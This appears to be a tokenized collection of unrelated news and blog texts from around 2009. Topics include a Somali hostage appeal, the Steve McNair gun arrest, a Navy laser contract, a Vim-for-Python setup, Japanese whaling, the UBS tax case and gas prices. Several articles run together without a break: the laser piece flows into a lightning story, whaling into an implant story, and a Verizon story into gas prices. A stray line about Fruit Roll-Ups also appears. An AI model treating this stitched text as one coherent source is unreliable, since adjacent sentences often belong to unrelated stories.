Various eye tracking data indicates users are drawn to breaks in the text , including bold and italic fonts .
Furthermore , when online users read or scan text , they apparently will only re-evaluate their scan strategy when they detect particular formats .
One of the main factors , that subconsciously make users eyes stop and evaluate ; is bold tags .
So even if they hold no weight within search engines , I feel it is vital to ensure you give your website the best possible chance to connect with visitors .
Research always shows that user behaviour when consuming information on the internet follows a very basic pattern .
In Jakob Nielsen ’s words ; site visitors do n’t read ; they scan .
His study found that only 16 % of people will read a post word by word .
The implication is that readers need to be able to extract the key messages of a post at a glance , and not have to work for it .
This means that content must be made scannable .

So to end , I was recently watching the film American History X and related to the part in the script when he said “ it ’s always good to end a paper with a quote , if someone else has already said it best .
So if you ca n’t top it , steal from them and go out strong ” .
So here is my victim , Seth Godin .
He undertook an experiment regarding eye tracking and said he learnt the following :
“ The biggest lesson was n’t news to me , but it might be to your boss : your visitors are not rational and organized and linear .
You ca n’t count on them sitting still and hearing your story from beginning to end .
They wo n’t .
The answer is not to try to change human nature .
It ’s to embrace the hunting skills that people are bringing online ( and to their daily offline media consumption ) and to make your media match their needs . ”

An Alberta journalist , who 's been held hostage in Somalia for nearly 10 months , has made contact with CTV News .
Amanda Lindhout says she 's in desperate need of medical help and is begging for her ransom to be paid .
Early Wednesday morning a woman who claims to be Amanda Lindhout called the CTV National newsroom and read this statement :
" My name is Amanda Lindhout and I am a Canadian citizen and I 've been held hostage by gunmen in Somalia for nearly 10 months .
I 'm in a desperate situation .
I 'm being kept in a dark , windowless , room in chains without any clean drinking water and little or no food .
I 've been very sick for months without any medicine so I 'm begging my government and fellow citizens to assist my family in paying my ransom .
The Canadian government must have some duty to help its citizens in such a crisis and my fellow citizens can assist me in putting pressure on my government .
I love my country and want to live to see it again .
Without food or medicine , I will die here and I 'm in need of immediate aid .
I implore my family whom I love more than anything to continue to search for money for my release .
Without it , I will die here .
I also tell them they must deal directly with these people as my life depends on it .
My life is worth more than any money spent .
To fellow journalists in Canada please help bring attention to my situation and continue in any way possible in order that I may return home to Canada .
That 's all I can say . "
CTV
News played a recording of the call to someone who knows her very well and that person said there 's no doubt the voice belongs to Amanda Lindhout .
CTV
News also contacted Lindhout 's family about the statement but they refused to comment .
Lindhout is a journalist from Red Deer who was working for a French news agency in Somalia when she was kidnapped on August 23rd .
Along with Lindhout , her photographer Nigel Brennan and their translator were also captured near Mogadishu while they were on their way to a refugee camp .
After the kidnapping , a $ 2.5 - million ransom was demanded .
CTV
News has learned that ransom has now been dropped to $ 1 - million .
In January , the translator was let go but Lindhout and Brennan remain hostages .
In two days , Lindhout will turn 28 - years - old .

The Tennessee man accused of selling the gun used to kill former NFL quarterback Steve McNair is in custody facing a federal charge of being a convicted felon in possession of a firearm , authorities said Friday .
Police say Adrian Gilliam admitted he sold Sahel Kazemi the gun she used to kill NFL quarterback Steve McNair .
" This is another example of what can happen with a gun when a felon is selling it on the street with little to no interest other than just selling it for 100 bucks , " said Nashville , Tennessee , Police Chief Ronal Serpas .
Authorities said federal agents traced the gun used in the Fourth of July murder - suicide to Household Pawn in Nashville , which sold it in January 2002 .
" Further investigation revealed the 9 mm pistol was later sold for approximately $ 100 to Adrian Gilliam approximately one to one and a half years ago , " Nashville police said in a news release .
Gilliam , 33 , of LaVergne , Tennessee , told detectives that on July 2 he sold the gun for about the same price to Sahel Kazemi outside a shopping mall .
Police said Kazemi , McNair 's 20 - year - old girlfriend , used the gun two days later to fatally shoot McNair -- a former Tennessee Titans quarterback and married father of four -- and herself in McNair 's condominium in downtown Nashville .
Do n't Miss Thousands gather for McNair 's funeral service
Gilliam had been convicted of second - degree murder and attempted armed robbery in Florida in 1993 , according to the new release , and those felony convictions meant that he could not legally be in possession of a firearm .
Along with Serpas , the announcement of the arrest was made by Edward M. Yarbrough , the U.S. attorney for the Middle District of Tennessee ; James M. Cavanaugh , the Special Agent in Charge of the Bureau of Alcohol , Tobacco , Firearms & Explosives ' Nashville Division ; and Mark Gwyn , director of the Tennessee Bureau of Investigation .

All About Steve McNair • Murder and Homicide
One of the most critical questions in the world of seagoing death - ray technology today - that is , who would be selected to develop swivelling " R2 - D2 " robotic laser blaster gun turrets for US Navy warships - has now been answered .
American weaponry megacorp Northrop Grumman , makers of the first electric solid - state " battle strength " raygun module , have scooped a $ 98 m deal from the Office of Naval Research .
Under the deal , announced this week , Northrop will provide a demonstrator Maritime Laser system capable of being fitted to US warships of frigate size and up .
In no more than 18 months , according to the deal , there will be " a real - time , 'at sea ' dynamic demonstration showing a counter - material capability against small boats " .
The ONR has previously said that raygun makers seeking to supply the Maritime Laser are highly encouraged to use existing gun mounts suitable for the task , such as that of the Phalanx radar - controlled gatling autocannon - nicknamed " R2 - D2 " among US sailors .
The Phalanx is sufficiently quick and accurate that it can blast incoming missiles and aircraft from the sky , let alone comparatively slow - moving small boats from the water .
Such boats , attacking in swarms , are generally considered a likelier naval threat than shipkiller missiles , but even so it is n't immediately clear what a laser turret really brings to the party at sea .
Phalanxes are also nowadays used ashore on occasion , however , blasting rockets and mortars lobbed over the perimeter fences of US and allied bases by local insurgents .
Special ammo with a time delay self - destruct fuse is used so as to avoid peppering the entire neighbourhood with 20 mm cannon shells , but even so dangerous shrapnel and duds get scattered about fairly freely .
A laser would have no such problem , so a raygun Phalanx might indeed be useful if Northrop and the ONR can develop one .
And there would be some lesser advantages at sea , too ; a laser Phalanx would n't run out of ammo , and would n't use up space in the ship 's magazines .
Current warships would seem well able to provide enough electricity for laser Phalanxes .
FFG 7 Oliver Hazard Perry ( OHP ) class frigates , the smallest ships specified by the ONR , carry a single Phalanx .
Northrop say their electric war - lasers are about 20 per cent efficient , so a 100 kilowatt battle - strength beam would tie up half a megawatt of generating capability .
OHPs carry four 1 - megawatt generators , so they should normally be able to supply enough juice .
Regrettably for those interested mainly in the related field of shark - portable energy weaponry for use in the disposal of meddling government agents , incompetent or traitorous henchmen etc , the technology is n't yet sufficiently mature for employment by normal sized lair - dwelling piscine enforcement operatives .
There would in any case be significant risk of a distressing explosive mishap in the event of a poorly - trained or excitable pool shark inadvertently triggering its raygun with its head underwater .
Supervillains with genetic - engineering expertise among their henchmen or captives might opt for a gigantic mutated shark able to carry the necessary machinery , but this could necessitate costly lair and execution - pool enlargement . ®
Saved by my iPod : Girl survives lightning strike after wire diverts 300,000 volts
A teenage girl survived a terrifying lightning strike after she was saved by the wire of her iPod .
Schoolgirl Sophie Frost and her boyfriend Mason Billington , both 14 , stopped to shelter under a tree when a storm struck as they were walking near their homes .
Doctors believe Sophie survived the 300,000 - volt surge only because it travelled through the gadget ’s wire , diverting it away from her vital organs .
Scorched : Sophie Frost , 14 , shows what happened to her clothes when she and her boyfriend Mason Billington were struck by lightning
The teenager was taken to hospital and is recovering from burns to her chest and legs while Mason suffered damage to his eyes .
Both are expected to make a full recovery and Sophie may not even have a permanent scar .
Sophie , on her hospital bed , said she was saved by headphone wires diverting the bolt away from her body
She will be thankful she was wearing her iPod , which she had been given four days earlier as a gift from her grandmother .
Returning from hospital yesterday after three days of treatment , she said : ‘ I ’m just glad to be alive .
I do n’t remember a thing about what happened , but from what everyone tells me it ’s a miracle I ’m still here .
‘ Everybody ’s said the iPod must have diverted the lightning away from my body , which probably saved my life .
I ’ve got a few burns , but it ’s all healing OK . ’
Sophie and Mason were knocked unconscious by the lightning bolt while holding hands and taking shelter in a field on Monday night .
Mason came round and carried Sophie , who was scorched and unconscious , to a nearby road where he flagged down a female motorist who took the couple to Southend hospital .
The iPod had been bought by Sophie 's grandmother only a few days before the lightning strike
Sophie suffered burns to her body and legs , some temporary damage to her eyes and a perforated eardrum .
Dr Ian Cotton , a reader in electrical engineering at Manchester University , said Sophie could have been saved by her iPod .
‘ If lightning hits a person it can do one of two things .
It can go down the outside of the skin , which is more likely if someone is caught in a storm and their body is wet .
‘ Or it can puncture the skin and go into the body .
Potentially a metal wire , which is highly conductive could divert the electricity away from the heart and save someone ’s life . ’
Sophie was reunited with her boyfriend and family in Rayleigh , Essex , yesterday after being transferred to the Broomfield Hospital for burns treatment .
She said Mason , whose eyesight is now back to normal , was a hero .
‘ My mum thinks he ’s wonderful , ’ she added .
Freak lightning strike puts gaping hole through roof
A bolt of lightning hit a home in Cheshire and left a gaping hole in its roof .
Lorraine and Luciano Coppola 's home burst into flames after the strike and the remains of a bed and chest of drawers can be seen from above the building .
Bolt from the blue : A freak lightning strike put a gaping hole in the roof of this home in Altincham , Cheshire
Thirty firefighters rushed to the luxury townhouse , in Bowdon , Altrincham , at 10 pm on Thursday night , and battled for hours to contain the blaze .
Eleven nearby homes had to be evacuated .
Fire chief Nigel Perkins said it was the first time in 23 years he 'd seen a house struck by lightning .
Mrs Coppola , 62 , a mother - of - three , was alone in the house at the time .
She said : ' There was a very loud bang , the lights went out and I thought there 'd been a power cut .
I thought lightning must have hit somewhere .
' I went to check with my neighbour John and then from around the back I could see smoke coming from the back bedroom . '
In the end he chooses to pack Fruit Roll - Ups in his lunch instead of Gushers .

Update :
This is a re-post of an older blog post of mine .

Finding the perfect IDE for Python is n’t an easy feat .
There are a great many to chose from , but even though some of them offer really nifty features , I ca n’t help myself but feel attracted to VIM anyway .
I feel that no IDE accomplishes the task of giving the comfort of complete power over the code – something is always missing out .
This is why I always come back to using IDLE and VIM .
Those two seem to be best companions when doing some quick and agile hacking – but when it comes to managing bigger and longer term projects , this combo needs some tweaking .
But when it ’s done , VIM will be a powerful IDE for Python – including code completion ( with pydoc display ) , graphical debugging , task - management and a project view .
This is where we are going :
VIM as Python IDE
So , these are my thoughts on a VIM setup for coding ( Python ) .
Modern GUI VIM implementations like GVIM or MacVIM give the user the opportunity to organize their open files in tabs .
This might look convenient , but to me it is rather bad practice , because a second tab will not be in the in the same buffer scope as the first one which takes away from future interaction options between the two .
Using MiniBufExplorer , however , gives the user tabs ( not only in the GUI , but also in command line ) and leaves the classic buffer interaction intact .
VIM MiniBufExplorer
Being able to neatly work on multiple files , the user still misses the potential his favourite IDE gives him in visualizing classes , functions and variables .
Luckily there are quite a few plugins around to accomplish this task just as well .
My favourite one would be TagList .
TagList uses Exuberant Ctags for actually generating the tags ( note : it really relies on this specific version of ctags – preinstalled implementations on UNIX systems wo n’t work ) .
VIM Exuberant Ctags TagList
A lot of coders have the habit of using TODO or FIXME statements in their code .
Other IDEs often rely on having good third party project management software , but not VIM .
There are great plugins like Tasklist reminding the programmer of those lines of code .
Tasklist even implements custom lists – to me that ’s an incredible productivity gain .
VIM Tasklist
In these times , the programmer knows his or her programming language more or less by interactively finding out what it can do .
Therefore code completion ( sometimes also called IntelliSenseugh ) is a major feature .
I have heard many people saying that this is where VIM fails – but luckily they are plain wrong ( ;
In V7 , VIM introduced omni completion – given it is configured to recognize Python ( if not , this feature is only a plugin away ) Ctrl+x Ctrl+o opens a drop down dialog like any other IDE – even the whole Pydoc gets to be displayed in a split window .
VIM Omnicompletion
Probably the most wanted feature ( besides code completion ) is debugging graphically .
VimPDB is a plugin that lets you do just that ( .
I acknowledge it is no complete substitution for a full fledged graphical debugger , but I honour the thought that having to rely on a debugger ( often ) , is a hint of bad design .
VIM Debugger VimPDB
From the eye - candy to the implementation .
Do n’t worry , it ’s no sorcery .
First of all , make sure you have VIM version > =7.x installed , compiled with Python support .
To check for the second , enter : python print “ hello , world ” into VIM .
If you see an error message like “ E319 : Sorry , the command is not available in this version ” , then it ’s time to get a new one .
If you ’re on a Mac , just install MacVIM ( there ’s also a binary for the console in / Applications / MacVim.app/Contents/MacOS / ) .
If you ’re on Windows , GVIM will suffice ( for versions != 2.4 search for the right plugin ) .
If you ’re on any other machine , you will probably know how to compile your very own VIM with Python support .
Second , check if you have a plugin directory .
In Unix it would typically be located in $ HOME /. vim / plugin , in Windows in the Program Files directory .
If it does n’t exist , create it .
In this Blog Post , I ’ll show you how to manually install these plugins .
Of course , there is other options like using the wonderful Pathogen of Tim Pope , or using the VIM8 plugin methodology .
Now , let ’s start with the MiniBufExplorer .
Get it and copy it into your plugin directory .
To start it automatically when needed and be able to use it with keyboard and mouse commands , append these lines in your vimrc configuration :
let g:miniBufExplMapWindowNavVim = 1 let g:miniBufExplMapWindowNavArrows = 1 let g:miniBufExplMapCTabSwitchBufs = 1 let g:miniBufExplModSelTarget = 1
For a project view , get TagList and Exuberant Ctags .
To install Ctags , unpack it , go into the directory and do a compile / install via :
. / configure && sudo make install make install
Ctags will then be installed in /usr / local / bin .
When using a Windows machine , I recommend Cygwin with GCC and Make ; it ’ll work just fine .
If you do n’t want to tamper with your original ctags installation , you can propagate the location to VIM by appending the following line to vimrc :
let $ Tlist_Ctags_Cmd='/usr/local/bin/ctags '
To install TagList , just drop it into VIMs plugin directory .
You will now be able to use the project view by typing the command : TlistToggle .
Tasklist is a simple plugin , too .
Copying it into the plugin directory will suffice .
I like to have shortcuts and have added
map T : TaskList <CR > map P : TlistToggle <CR >
to vimrc .
Pressing T will then open the TaskList if there are any tasks to process .
q quits the TaskList again .
VimPDB is a plugin , as well .
Install as before and see the readme for documentation .
To enable code ( omni ) completion , add this line to your vimrc :
autocmd FileType python set omnifunc=pythoncomplete #Complete
If it does n’t work then , you ’ll need this plugin .
My last two recommondations are setting these lines to comply to PEP 8 ( Pythons ’ style guide ) and to have decent eye candy :
set expandtab set textwidth=79 set tabstop=8 set softtabstop =4 set shiftwidth=4 set autoindent : syntax on
There are certainly a lot more flags to help productivity , but those will probably be more user specific .
Have fun coding Python while not being bound to a specific IDE , but having all the benefits of VIM bundled with a few helping hands .

The Southern Ocean has lost its appetite for carbon dioxide , and now it appears that the ozone hole could be to blame .
In theory , oceans should absorb more CO 2 as levels of the gas in the atmosphere rise .
Measurements show that this is happening in most ocean regions , but strangely not in the Southern Ocean , where carbon absorption has flattened off .
Climate models fail to reproduce this puzzling pattern .
The Southern Ocean is a major carbon sink , guzzling around 15 per cent of CO 2 emissions .
However , between 1987 and 2004 , carbon uptake in the region was reduced by nearly 2.5 billion tonnes – equivalent to the amount of carbon that all the world ’s oceans absorb in one year .

Premature effect
To figure out what is going on , Andrew Lenton , from the University of Pierre and Marie Curie in Paris , France , and his colleagues created a coupled ocean and atmosphere climate model , to investigate carbon absorption in oceans .
Crucially , they included changes in the concentration of stratospheric ozone since 1975 .
By running their model with and without the ozone depletion since 1975 , Lenton and his colleagues were able to show that the ozone hole is responsible for the Southern Ocean ’s carbon saturation .
The effect could be down to the way decreasing stratospheric ozone and rising greenhouse gases are altering the radiation balance of the Earth ’s atmosphere .
This has been predicted to alter and strengthen the westerly winds that blow over the Southern Ocean .
“ We expected this transition to a windier regime , but it has occurred much earlier than we thought , seemingly because of the ozone hole , ” says Lenton .
‘ Unexpected effect ’
Stronger surface winds enhance circulation of ocean waters , encouraging carbon - rich waters to rise from the deep , limiting the capability of surface water to absorb carbon from the atmosphere .
Furthermore , the higher carbon levels in surface waters make them more acidic – bad news for many forms of ocean life , such as coral and squid .
“ This result illustrates how complex the chain of cause and effect can be in the Earth system .
No one would ever have predicted from first principles that increasing CFCs would have the effect of decreasing uptake of ocean carbon dioxide , ” says Andrew Watson , from the University of East Anglia , UK .

WASHINGTON -- President Barack Obama plans to throw out the ceremonial first pitch before the All - Star Game at Busch Stadium in St. Louis on July 14 .
The White House said Tuesday that Major League Baseball 's focus on community service matches with Obama 's service initiative this summer , known as United We Serve .
" The central theme of the 2009 All - Star Game is community service , celebrating the extraordinary work being done by ordinary people , " baseball commissioner Bud Selig said .
" We are thrilled that we can come together with President Obama , who has encouraged a renewed spirit of national service , and illustrate a call to action in our communities .
President Obama will continue a great tradition that joins our nation 's leader and the national pastime . "
Obama , a White Sox fan , will be the fourth president to throw out the first pitch at an All - Star Game , following John F. Kennedy ( 1962 in Washington ) , Richard Nixon ( 1970 in Cincinnati ) and Gerald Ford ( 1976 in Philadelphia ) .
In addition , Franklin D. Roosevelt attended the 1937 game in Washington , and George H.W. Bush went to the 1991 game at Toronto with Canadian Prime Minister Brian Mulroney and the 1992 game at San Diego with President Carlos Salinas de Gortari of Mexico .
Ford ( 1978 in San Diego ) and Ronald Reagan ( 1989 in Anaheim ) attended as former presidents .
Obama did n't accept an invite from the Reds to throw out the first pitch at Saturday 's Civil Rights Game in Cincinnati against the Chicago White Sox .
The White Sox also were said to have invited Obama before their opener against Kansas City on April 6 , and Nationals manager Manny Acta had hoped Obama would throw out the first pitch prior to Washington 's home opener against Philadelphia on April 13 .
As a U.S. Senator , he threw out the ceremonial first pitch before the White Sox defeated the Anaheim Angels 2 - 1 in Game 2 of the 2005 AL Championship Series .
Meanwhile , the Class A Brooklyn Cyclones renamed themselves the Baracklyn Cyclones , in tribute to the new president , on Tuesday and gave out a bobblehead doll of the president .
Tickets cost no more than $ 16 , cheaper than nosebleed seats at Yankee Stadium and Citi Field .
The action included ceremonial first pitches thrown out by Amber Lee Ettinger , the Obama Girl , and presidential lookalike Randall West .
The real first family did n't take the Cyclones up on their invitation to attend .
Players on the Mets farm team wore white jerseys with " Baracklyn " across the chest in red , red - and - white stripes on one sleeve and a mixture of stripes , white stars and a blue background on the other .
In a promotion invented by Cyclones general manager Steve Cohen , some fans received free Band - Aids as part of " Universal Health Care . "
People named Barack got in for free , anyone named McCain or Palin received free bleacher seats and plumbers named Joe got two free tickets .
There was one plumber named Joe and a Barak Zahavy in the overflow crowd of 8,760 , Cyclones spokesman Dave Campanaro said .
The Hall of Fame even called , requesting a jersey , before Brooklyn's 7 - 3 victory .
It 's all part of the fun of Minor League Baseball , coming off six straight years of record attendance .
Its 176 teams combined to draw 43.2 million fans last year ; through Sunday they attracted an average of 3,993 per game .
Despite the recession that 's down only 27 fans , or less than 1 percent , from last year 's average through the same time .
The 30 major league teams averaged 29,412 through Sunday , a drop of 6.6 percent from the average of 31,484 through June 21 last year .

We 've seen a lot of unexpected , and sometimes cool , iPhone apps approved by Apple , but today 's news might top the rest .
Apple has approved a marijuana -- that 's right , marijuana -- app called " Cannabis , " which lets users find the nearest ( do n't worry : legal ) supplier of medicinal marijuana .
Created by the founder of Ajnag.com , which was founded in 2006 and was the first medicinal marijuana locater on the Web , the new app is quick and easy to use .
Simply open it up on your iPhone or iPod Touch and you 'll see a map with the nearest distributors .
The app gives you information on each of the locations , and even step - by - step directions with Google Maps .
That 's not all , though -- the creators thought of everything .
If you run into any , erm , legal troubles with your newly - secured marijuana , Cannabis also gives you the locations of the nearest lawyers who specialize in marijuana cases .
And , if you happen to live in one of the 37 states where marijuana is not legal , the app also provides you with the location of the nearest marijuana activist groups -- so you can do your part to promote reform .
Cannabis provides the locations of legal marijuana locations in the 13 states where medical marijuana is legal , as well as in the parts of Europe where marijuana use is legal .
It will not point you to your local dealer in Golden Gate park or to the nearest White Castle , though , so potheads should save themselves the $ 2.99 download fee .
But , if you 're a legitimate user of medicinal marijuana , and you often find yourself in situations where you absolutely must obtain some , then , good lord , get thee to the App Store !

Forth Dimensions
The original scanning of Forth Dimensions was done by Ed Thelen in August 2003 , for the gang at Harry 's Hofbrau .
Bob Smith provided the printed documents and assisted in scanning them .
A separate scan was done by John Hall .
In addition , Jay McKnight used the optical character recognition function of Adobe Acrobat to further process these image files , converting them into the searchable PDF documents listed here .
A note on these Forth Dimensions files : " I have processed these Forth Dimensions PDF files thru the " optical character reader " ( OCR ) and " reduce file size " functions of Adobe 's " Acrobat Version 7 " .
This does a pretty good , but not perfect , job of recognizing continuous English - language text characters , but I have not proof - read any of the text , so there will certainly be errors . "
" So with such text you can use Acrobat or the free Acrobat Reader to view these files as an image , and to search for words , or to copy words , lines , or blocks of text , which are " text behind the image " .
But for any critical application , you must proof read the resultant text . "
" With program listings , this Acrobat OCR does not work so well .
It tends to ignore columns of numbers , and perhaps even columns of alphanumeric characters that are not English - language words .
It also stops working after a long space between columns .
Acrobat has many " preferences " that one must search for .
Also there are other OCR programs , such as " OmniPage " , sold by Nuance .
So if you need to OCR the program listings , it would be worth while for you to see if there is a better way to do it than I have used here . "

Japan claims that it only hunts whales to further science , but their research has little impact and is not circulated ( Image : Andrzej Krause ) Commercial whaling is still banned , but Japan has a special permit to hunt whales for research purposes ( Image : Mike Hill / Getty )
IN 1986 , the International Whaling Commission ( IWC ) imposed a moratorium on commercial whaling to allow stocks to replenish .
However , this ongoing ban allows member nations to grant themselves special permits to kill whales for scientific research , with the proviso that the whale meat is utilised following data collection .
Advertisement
Only Japan holds a special permit .
Its current research programme , which started in 2000 and is run by the Japanese Institute of Cetacean Research ( ICR ) , proposes to kill more than 1000 whales a year in the Antarctic and the western north Pacific .
The stated objectives are to determine the population structure and feeding habits of several whale species , including endangered fin and sei whales , in order to “ manage ” stocks .
Japan has already been widely criticised for its whaling , which is generally seen as a thinly disguised hunting operation .
But with the 2009 IWC meeting looming , it is worth rehearsing the arguments against scientific whaling .
Although Japan ’s early results produced useful information , recent advances in non-lethal techniques such as biopsies mean that data can now be obtained without killing whales .
Similarly , it is no longer necessary to kill whales to work out what they have been eating , as this can be determined from DNA in samples of faeces .
The scientific impact of the research is also limited .
Relatively little research is published in international peer - reviewed journals , compared with research programmes on other marine mammals such as dolphins .
According to the ICR , scientific whaling has produced 152 publications in peer - reviewed journals since 1994 .
However , just 58 of these papers were published in international journals .
The rest were IWC reports or articles published in domestic journals , largely in Japanese .
Most of the findings are not circulated among the wider scientific community , and the failure to subject papers to impartial review renders the value of much of this literature questionable .
Whether the results from scientific whaling are useful for stock management has also been questioned .
The Scientific Committee of the IWC has explicitly stated that the results generated by the Japanese Whale Research Program in the Antarctic ( JARPA ) “ were not required for management ” .
Independent research shows that the data may overestimate whale abundance by up to 80 per cent ( Marine Ecology Progress Series , vol 242 , p 295 ) .
Finally , given that there is considerable variation in the capacity of different whale populations to recover from stock depletion ( Marine Mammal Science , vol 24 , p 183 ) , the value of the research for understanding populations outside the Antarctic and western north Pacific – which may one day be reconsidered for commercial whaling – is limited .
This fundamentally undermines the justification for scientific whaling .
A 45 - year - old Russian woman found herself in need of medical treatment when the her F - cup implants burst on an Aeroflot flight from Moscow to Los Angeles .
Irena D’s ( as her name has been reported by the Russian press ) ailment was not immediately obvious to doctors when she collapsed at LA airport but after a thorough examination they were soon abreast of the situation .
According to one doctor :
The flight per se could not damage the implants .
Most likely , she already had problems with them before , and the implants burst because of the pressure differential on board the plane .
Irena D has since had the implants removed and been warned of the potential health consequences of further breast augmentation .

* U.S. judge orders U.S. govt to say how far it would go
* Switzerland says would stop UBS handing over client data
* Berne says may seize UBS client data , if necessary
* Judge may be pushing for a settlement ( Adds comment on judge ’s order , background , paragraphs 7 - 10 )
By Lisa Jucca and Tom Brown
ZURICH / MIAMI , July 8 ( Reuters ) - A judge ordered the U.S. government to say whether it was prepared to shut Swiss bank UBS AG UBSN .
VXUBS.N in the United States as part of a battle to learn the identity of 52,000 secret accounts suspected of being used by Americans to avoid taxes .
U.S. District Judge Alan Gold , set to preside over a hearing Monday of a suit seeking to force UBS to provide the information , asked specifically Wednesday about “ receivership and / or seizure of UBS ’ assets within the United States . ”
Gold said such remedies might be requested of the court if UBS failed to comply , or was prevented from complying by the Swiss government .
He gave the U.S. Justice Department until noon ( 1600 GMT ) on Sunday to respond .
Switzerland has vowed to prevent UBS from handing over client information to U.S authorities , in an attempt to defend bank secrecy , and says the tax case targeting its biggest bank is souring diplomatic ties .
Washington has accused UBS of hiding nearly $ 15 billion in assets in secret accounts but the tax litigation is also crucial for the future of the multibillion - dollar wealth management industry and is pushing several offshore banks to force clients to come clean .
The Swiss Justice Ministry said earlier on Wednesday that Swiss law prevents UBS from handing over client information and the government would seize UBS client data , if necessary , to stop that happening .
Peter D. Hardy , a former U.S. prosecutor , said Gold may be pushing for a last - minute settlement in the case , but the judge was also putting the Justice Department in a tough spot .
“ They ’re going to have to be very delicate and thoughtful in terms of how they respond to this , ” said Hardy , a partner at the Post & Schell law firm in Philadelphia .
The U.S. government was criticized in 2002 over the collapse of accounting firm Arthur Andersen with the loss of thousands of jobs .
Andersen failed to reach a settlement with the Justice Department over its auditing of Enron and surrendered its audit license after being found guilty on a single criminal charge .
The U.S. Supreme Court eventually overturned the verdict but Andersen never recovered .
DATA BATTLE
The UBS case , which comes amid a global fight against tax cheats supported by the U.S. administration , has damaged the UBS brand and could result in an expensive settlement for the bank at a time when the bank needs to focus on restructuring .
“ Switzerland will use its legal authority to ensure that the bank cannot be pressured to transmit the information illegally , including if necessary by issuing an order taking effective control of the data at UBS , ” the Swiss government said in a response to U.S. authorities , filed in court in Miami on Tuesday .
Although Swiss criminal law prohibits banks passing on client information to foreign authorities , UBS and Switzerland have already made concessions on their treasured bank secrecy .
UBS agreed to pay in February $ 780 million , admitted wrongdoing and disclosed about 250 client names to avert tax fraud criminal charges the Swiss government said threatened the bank ’s survival .
And faced with the threat of possible sanctions from the G20 , Switzerland -- along with other tax havens -- vowed in March to redraft its tax treaties with the United States and other countries and cooperate more on tax evasion .
In a court brief last week , the U.S. Justice Department said that UBS had already acknowledged that its bankers committed “ very serious crimes on U.S. soil ” and had therefore subjected the bank to the full jurisdiction of U.S. law .
“ Swiss banking secrecy is not an impenetrable wall , ” it said .
But Berne said the fact that UBS had released some names in settling the criminal case and admitted wrongdoing did not undermine the legitimacy of Swiss banking secrecy as a whole .
Although the court hearing is due next week , the Swiss government has not ruled out the possibility of UBS and Washington agreeing another out - of - court settlement .
Swiss Finance Minister Hans - Rudolf
Merz has repeatedly said there is still room for a deal and Swiss Economy Minister Doris Leuthard told Reuters in an interview on Tuesday that it expected UBS to pay a price as the bank had made mistakes .
Swiss media have said UBS may have to pay 3 - 5 billion Swiss francs ( $ 2.76 - $ 4.6 billion ) .
The bank raised 3.8 billion francs of capital late in June and will report earnings on Aug .

A 62 - year - old man had a mental breakdown and ran off after grabbing several bottles of pills from his house .
The cops asked Verizon to help trace the man using his cellphone , but Verizon refused , saying that they could n't turn on his phone because he had an unpaid $ 20 bill .
After an 11 - hour search ( during which time the sheriff 's department was trying to figure out how to pay the bill ) , the man was found , unconscious .
Two K - 9 units , several fire departments and 100 individuals on foot also were involved in the search for the man , who Sheriff Dale Williams said fled his residence on Kensington Rd. after a domestic disturbance call to deputies …
Williams said he attempted to use the man 's cell phone signal to locate him , but the man was behind on his phone bill and the Verizon operator refused to connect the signal unless the sheriff 's department agreed to pay the overdue bill .
After some disagreement , Williams agreed to pay $ 20 on the phone bill in order to find the man .
But deputies discovered the man just as Williams was preparing to make arrangements for the payment .
Oh brother , Californians dealing with double - digit unemployment , steep wage cuts and bleak 401 ( k ) reports are getting hammered again .
Gas prices crossed the $ 3 threshold in California on Monday , hitting an average of $ 3.01 a gallon , the highest since Halloween and $ 1.21 a gallon more than we were paying at Christmas .
A 15 - gallon fill - up now costs $ 18.15 more than it did in December .
Why the increase ?
Demand is down because the recession has cut commuting and summer driving plans .
But decreased demand has led to decreased oil production , imports and refining — thereby tightening supplies and driving up prices .
“ Let prices increase more and the economic slowdown will be longer , ” said Randy Dugger , a computer consultant from San Jose who puts 100 miles a day on his 2000 Subaru Outback and now drives 65 mph instead of 70 to save fuel .
And he heads to Costco for gas whenever he can “ to save a little bit more . ”
The question now : How high will prices go ?
Even though crude oil prices briefly slipped under $ 70 a barrel on Monday , most analysts say gas prices will go higher , perhaps another quarter or so .
“ We may see prices around the Bay Area top out around the $ 3.25 mark in the next couple of weeks , ” said Matt Skryja , who tracks fuel prices for AAA .
“ Many investors are anticipating a turnaround in the economy , and that has spurred them to buy more oil , which is helping to drive the price up . ”
Amid other signs of decreasing supply , the American Petroleum Institute on Tuesday is expected to report a decline of 1.7 million barrels of crude oil imports last week .
That would follow a drop of 676,000 barrels a day from the previous week .
The decreased availability of oil , combined with a slight increase in summer driving , can keep crude prices on the rise , and the price of crude , said Susanne Garfield of the California Energy Commission , is the main factor behind our woes at the pump .
“ Crude price , crude price and crude price , ” she said , pointing out that those costs have increased almost $ 30 a barrel since the beginning of the year .
Each $ 1 rise in the price of crude translates into a 2.5 - cent jump per gallon of gas .
But that is a far cry from last summer , when crude costs approached $ 150 a barrel and pump prices hit $ 4.59 a gallon in the Bay Area , the highest single - day mark on record .
“ Given the state of the world economy , let alone the U.S. and California ’s , it ’s difficult to imagine crude prices sustaining higher levels , ” Garfield said .
“ It ’s hard to imagine anything like last year . ”
Still , if fuel prices do climb to $ 3.25 a gallon , the fragile U.S. economy wo n’t be helped .
More money for gas means less money to spend on items that might help the nation recover from the recession .
“ The gasoline rise is like a tax we feel very painfully every time we go to a gas station , ” Ed Leamer , director of the UCLA Anderson Forecast , told the Los Angeles Times .
“ It adds uncertainty and can lead to people spending less .
It will tend to retard the economic recovery and make it less powerful . ”
Transit agencies across the country have designated Thursday as “ Dump the Pump Day . ”
Some bus and train lines may offer free fares — fares that will be rising this summer or next year as transit groups try to raise funds to overcome budget cuts .
R.T. Trask of Saratoga called in to voice his frustration over red lights on De Anza Boulevard and Saratoga - Sunnyvale Road through Cupertino and Sunnyvale .
Now , however , he has another gripe .
“ I ca n’t buy a green , ” he said .
“ This is awfully frustrating , especially since I have more time to look at the rising gasoline prices . ”

Remember when costs of the bailout were projected to be $ 0.5 Trillion , then $ 1 Trillion , then $ 3 Trillion .
Now , Neil Barofsky , special inspector general for the Treasury ’s Troubled Asset Relief Program says U.S. Rescue May Reach $ 23.7 Trillion .
U.S. taxpayers may be on the hook for as much as $ 23.7 trillion to bolster the economy and bail out financial companies , said Neil Barofsky , special inspector general for the Treasury ’s Troubled Asset Relief Program .
The Treasury ’s $ 700 billion bank - investment program represents a fraction of all federal support to resuscitate the U.S. financial system , including $ 6.8 trillion in aid offered by the Federal Reserve , Barofsky said in a report released today .
“ TARP has evolved into a program of unprecedented scope , scale and complexity , ” Barofsky said in testimony prepared for a hearing tomorrow before the House Committee on Oversight and Government Reform .
